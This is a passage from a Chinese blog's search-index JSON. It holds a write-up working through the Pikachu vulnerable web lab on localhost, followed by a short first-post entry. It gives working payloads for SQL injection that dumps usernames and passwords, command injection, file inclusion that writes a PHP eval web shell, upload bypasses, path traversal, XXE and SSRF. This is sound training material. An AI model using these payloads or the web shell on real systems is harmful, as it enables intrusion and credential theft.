updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)),0) and &#x27;1&#x27;=&#x27;11&#x27; and updatexml(1,concat(0x7e,(select id from users limit 0,1)),0) and &#x27;1&#x27;=&#x27;1 6.Delete注入还挺新颖的，留言板无法注入，随便输入，然后删除，抓包 抓包发现get传了一个id，那么利用id注入，还是用报错注入 注意： 一些关键字如#，空格需要进行URL格式转换 7.http头注入根据提示登录抓包，用user-agent进行注入 playlaod: 1&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),1,31),0x7e),1) or &#x27; 8.布尔盲注上python脚本吧，把做sql的题目的脚本捡起来改改 脚本就是方便啊 9.延时盲注把上面的脚本改改，延时耗时太长了，不赘述了 10. 宽字节注入lili%df’ or 1&#x3D;2 继续改布尔盲注的脚本吧 RCE1.exec “ping”playload: 1ping 127.0.0.1 |whoami 2.exec “eval”playload: 1phpinfo(); File Inclusion1.本地文件包含图片路径可修改，改为..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;win.ini 成功查win.ini文件，那么我们在本地写一个木马，就能通过这种方式用蚁剑连接了 2.远程文件包含创建一个shell.txt: 1&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[leon]) ?&gt; &#x27; ); ?&gt; playload: 1http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=G:\\phpstudy_pro\\WWW\\pikachu\\vul\\fileinclude\\shell.txt&amp;submit=%E6%8F%90%E4%BA%A4 成功生成shell.php，蚁剑连接 不安全的文件下载1.不安全的文件下载想找科比的路径，看到了有意思的东西 修改路径 点击成功下载 Unsafe file upload1.客户端check这里抓包改后缀或者浏览器关闭js都可以，我选择后者 2.服务端check这里直接抓包改后缀就行 3.getimagesize()大小不对的图片会被打回来，先在正常图片中插入一句话木马，但不会执行php语句，只能结合上上关的文件包含漏洞 playload: 1http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/shell.php&amp;submit=%E6%8F%90%E4%BA%A4 Over permission1.水平越权 在url这里把username改成别的用户 2.垂直越权登录admin账户，点击添加账户，并且记住url: 1http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php 登录普通pikachu账户，然后直接复制上面的链接进行添加账户，再登录admin账户，发现成功添加，那么就存在垂直越权。 ..&#x2F;..&#x2F;1.目录遍历playload: 1http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../../../Windows/win.ini 敏感信息泄露1.find abc f12找到账户 黄金时代👍我也很喜欢这一段 可以直接修改url得到敏感信息 PHP反序列化1.PHP反序列化漏洞没找到反序列化的代码，试了一下给的playload: 1O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125; 发现可以 XXE1.XXE漏洞playload: 1234&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt; ]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; url重定向1.不安全的url跳转 如图修改，点击则跳转百度 SSRF1.SSRF(curl)playload: 1http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/Windows/win.ini 2.SSRF(file_get_content)playload: 1http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/windows/win.ini","categories":[{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"}]},{"title":"我的第一篇博客","slug":"first blog","date":"2023-11-02T12:15:27.000Z","updated":"2023-11-03T15:41:37.813Z","comments":true,"path":"posts/51727.html","link":"","permalink":"https://foreon.github.io/posts/51727.html","excerpt":"","text":"我开始写博客了！此博客诞生于2023年11月2日。 今后我应该会更新一些随笔、ctf比赛writeup和学习总结。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"打招呼","slug":"打招呼","permalink":"https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"}]}],"categories":[{"name":"专业课学习笔记","slug":"专业课学习笔记","permalink":"https://foreon.github.io/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"writeup","slug":"writeup","permalink":"https://foreon.github.io/categories/writeup/"},{"name":"Learning record","slug":"Learning-record","permalink":"https://foreon.github.io/categories/Learning-record/"},{"name":"随笔","slug":"随笔","permalink":"https://foreon.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"大学课程学习","slug":"大学课程学习","permalink":"https://foreon.github.io/tags/%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"ctf","slug":"ctf","permalink":"https://foreon.github.io/tags/ctf/"},{"name":"linux","slug":"linux","permalink":"https://foreon.github.io/tags/linux/"},{"name":"打招呼","slug":"打招呼","permalink":"https://foreon.github.io/tags/%E6%89%93%E6%8B%9B%E5%91%BC/"}]}